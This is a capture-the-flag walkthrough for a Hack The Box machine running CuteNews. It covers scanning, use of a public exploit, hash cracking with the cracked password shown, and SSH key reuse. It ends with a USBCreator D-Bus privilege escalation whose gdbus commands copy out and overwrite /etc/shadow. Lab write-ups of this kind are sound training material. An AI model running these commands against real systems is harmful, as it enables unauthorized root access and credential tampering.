# Box 



![image-20210124120821454](img/image-20210124120821454.png)

https://www.hackthebox.eu/home/machines/profile/275

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Enumeration](#enumeration)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [User 2](#user-2)
  + [Root](#root)
* [Bonus](#bonus)

# Contents 

## Enumeration

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.206 10.10.10.206
```

![image-20210124131826442](img/image-20210124131826442.png)

We have a webpage. Let's take a look.

![image-20210124131856899](img/image-20210124131856899.png)

At the bottom of the page we can find 

![image-20210124131922870](img/image-20210124131922870.png)

Searching for "CuteNews" brings us to a lot of differents exploit, one that I find using searchsploit is this one : https://www.exploit-db.com/exploits/48800

## Exploitation

By using this software we have now a shell : 

![image-20210124132340137](img/image-20210124132340137.png)

We also got several hashes that I am gonna try to decrypt : 

![image-20210124141337723](img/image-20210124141337723.png)

Running hashcat : 

```bash
hashcat -m 1400 hash.txt rockyou.txt
```

We got one successful password. 

```bash
e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
```



We can now try to elevate to the user.

## Post-Exploitation

### User 1



After a while on the box, I find a file in `/var/www/html/CuteNews/cdata/users` which seems to contains multiple base64 encoded strings  

![image-20210124135949548](img/image-20210124135949548.png)

By decoding these string I can see the hash that we cracked earlier. 

![image-20210124141818570](img/image-20210124141818570.png)

Let's try to login as paul : 

![image-20210124141100349](img/image-20210124141100349.png)

### User 2

After one or two hours trying to find a file that seems suspicious I checked the .ssh keys that are by default in the folder :

![image-20210124162512508](img/image-20210124162512508.png)

And that was that simple. The private key is probably the nadav one so we just have to get it.

![image-20210124162716519](img/image-20210124162716519.png)

to root.

### Root

We can see there is a .viminfo file where we can see the history, there is one particular interesting file  : `/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf`

![image-20210308135701236](img/image-20210308135701236.png)



After a while i found this privesc using USBCreator : 

https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/

We can just copy/paste the command to get our flag :

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /tmp/flag.txt true
```

![image-20210308135939023](img/image-20210308135939023.png)

![image-20210308140025046](img/image-20210308140025046.png)

Rooted.



## Bonus

If you want to get a root shell you can use the previous command to copy the `/etc/shadow` file :

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /etc/shadow /tmp/shadow true
```

then use your own custom password and replace the system shadow file with your own :

```bash
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/shadow /etc/shadow true
```

![image-20210308140931645](img/image-20210308140931645.png)